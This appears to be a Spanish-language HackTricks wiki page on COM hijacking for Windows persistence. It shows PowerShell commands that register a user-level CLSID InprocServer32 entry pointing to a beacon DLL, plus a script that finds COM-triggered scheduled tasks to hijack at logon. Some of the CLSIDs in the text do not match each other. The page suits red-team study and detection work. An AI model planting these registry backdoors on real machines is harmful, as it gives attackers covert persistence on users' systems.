# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Búsqueda de componentes COM inexistentes

Dado que los valores de HKCU pueden ser modificados por los usuarios, **COM Hijacking** podría ser utilizado como un **mecanismo persistente**. Usando `procmon`, es fácil encontrar registros COM buscados que no existen y que un atacante podría crear para persistir. Filtros:

- Operaciones de **RegOpenKey**.
- donde el _Resultado_ es **NOMBRE NO ENCONTRADO**.
- y el _Path_ termina con **InprocServer32**.

Una vez que hayas decidido qué COM inexistente suplantar, ejecuta los siguientes comandos. _Ten cuidado si decides suplantar un COM que se carga cada pocos segundos, ya que eso podría ser excesivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM del Programador de Tareas que se pueden secuestrar

Las Tareas de Windows utilizan Disparadores Personalizados para llamar a objetos COM y, dado que se ejecutan a través del Programador de Tareas, es más fácil predecir cuándo se activarán.

<pre class="language-powershell"><code class="lang-powershell"># Mostrar CLSIDs de COM
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nombre de la Tarea: " $Task.TaskName
Write-Host "Ruta de la Tarea: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Salida de Ejemplo:
<strong># Nombre de la Tarea:  Ejemplo
</strong># Ruta de la Tarea:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [más como el anterior...]</code></pre>

Al revisar la salida, puedes seleccionar una que se va a ejecutar **cada vez que un usuario inicie sesión**, por ejemplo.

Ahora, buscando el CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** en **HKEY\CLASSES\ROOT\CLSID** y en HKLM y HKCU, generalmente encontrarás que el valor no existe en HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Luego, puedes crear la entrada HKCU y cada vez que el usuario inicie sesión, tu puerta trasera se activará.

{{#include ../../banners/hacktricks-training.md}}
